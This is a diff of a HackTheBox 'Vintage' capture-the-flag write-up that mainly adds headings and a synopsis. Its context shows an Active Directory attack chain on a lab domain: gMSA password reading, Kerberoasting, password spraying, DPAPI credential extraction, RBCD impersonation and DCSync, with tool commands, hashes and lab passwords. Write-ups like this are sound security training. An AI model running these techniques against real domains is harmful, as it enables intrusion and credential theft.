@@ -8,9 +8,10 @@ categories: ['HackTheBox', 'Windows', 'Active-Directory']
 
 ![](/assets/images/headers/Vintage.png)
 
+# Synopsis
 Vintage is a hard difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment without ADCS installed, and NTLM authentication is disabled. There is a 'Pre-Created computer account', meaning the password is the same as the sAMAccountName of the machine account. The 'Domain Computer' organisational unit (OU) has a configuration allowing attackers to read the service account password, which has gMSA configured. After obtaining the password, the service account can add itself to a privileged group. The group has complete control over a disabled user. The attacker is supposed to restore the disabled user and set a Service Principal Name (SPN) to perform Kerberoasting. After recovering the password, the user account has reused the same password. The newly compromised user has a password stored in the Credential Manager. The user can add itself to another privileged group configured for Resource-Based Constrained Delegation (RBCD) on the Domain Controller, allowing the attacker to compromise it.
 
-# Reconnaissance
+## Reconnaissance
 For this machine we are given some initial credentials to authenticate (`P.Rosa:Rosaisbest123`) and the initial nmap scan already shows we are dealing with a Domain Controller.
 
 ```console
@@ -92,6 +93,7 @@ C.Neri_adm
 L.Bianchi_adm
 ```
 
+### Kerberos Authentication
 After using some common queries over ldap, I decided to retry using NetExec with the `-k` flag which uses Kerberos as authentication protocol instead of NTLM (default).
 
 ```console
@@ -137,6 +139,7 @@ The first thing I found was that the computer account `FS01$` belongs to the `PR
 
 ![](/assets/images/writeups/vintage/BH-FS01-Member.png)
 
+### Pre-Created Computer
 When a new computer account of this type is configured, its password is set based on its name (i.e. lowercase computer name). Let's verify if we can get a TGT by using the standard password for this computer account.
 
 ```console
@@ -150,6 +153,7 @@ We managed to save the machine's TGT meaning this is indeed a valid password. Lo
 
 ![](/assets/images/writeups/vintage/BH-FS01.png)
 
+### ReadGMSAPassword Abuse
 There are several methods we can use to read this password, but the easiest method is to use `BloodyAD.py`. Again we need to do our authentication over Kerberos by using the TGT of `FS01$`.
 
 ```console
@@ -159,7 +163,7 @@ distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
 msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
 msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==
 ```
-
+### GenericWrite Abuse
 We got the NTLM hash and the Base64 encoded password. We again retreive the TGT of the GMSA account and add ourself to the `SERVICEMANAGERS` group.
 
 ```console
@@ -218,6 +222,8 @@ distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
 userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; DONT_REQ_PREAUTH
 ```
 
+### Restore Disabled Account
+
 With our `GenericAll` rights, we can enable the account in order to get the hash.
 
 ```console
@@ -236,7 +242,10 @@ $ hashcat services.hashes -m 18200 $ROCKYOU
 ```
 
 ## User
-We are only able to crack the password for `svc_sql` which is `Zer0the0ne`. Well we got a password but the account is not of much use, so lets do some password spraying.
+We are only able to crack the password for `svc_sql` which is `Zer0the0ne`. 
+
+### Password Spraying
+Well we got a password but the account is not of much use, so lets do some password spraying.
 
 ```console
 $ nxc smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success
@@ -277,6 +286,8 @@ Cannot find KDC for realm "VINTAGE.HTB"
 Error: Exiting with code 1
 ```
 
+### WinRM with Kerberos
+
 When we attempt to connect via WinRM, we got an error that the KDC cannot be found. To fix this we need to edit our `/etc/krb5.conf` file as follows:
 
 ```console
@@ -305,6 +316,7 @@ $ evil-winrm -i dc01.vintage.htb -r vintage.htb
 ```
 
 ## Root
+### DPAPI Credential Extraction
 We can look for any stored credentials and try to extract them. The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at `C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID`. Lets have a look if our user has any credentials stored.
 
 ```powershell
@@ -374,6 +386,8 @@ Unknown     : Uncr4ck4bl3P4ssW0rd0312
 
 We found a password for the user `c.neri_adm`. 
 
+### RBCD Attack
+
 ![](/assets/images/writeups/vintage/BH-NERI-delegate.png)
 
 This user is part of the `DELEGATEDADMINS` group. Members of this group have the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer `DC01.VINTAGE.HTB`. We can use these privileges to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user. However, in order to perform the attack we need to have access to an account with an SPN set.
@@ -405,6 +419,8 @@ $ getST.py -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.10.
 [*] Requesting S4U2Proxy
 [*] Saving ticket in L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
 ```
+
+### DCSync
 
 Now we can perform a DCSync attack and grab the root flag.
 
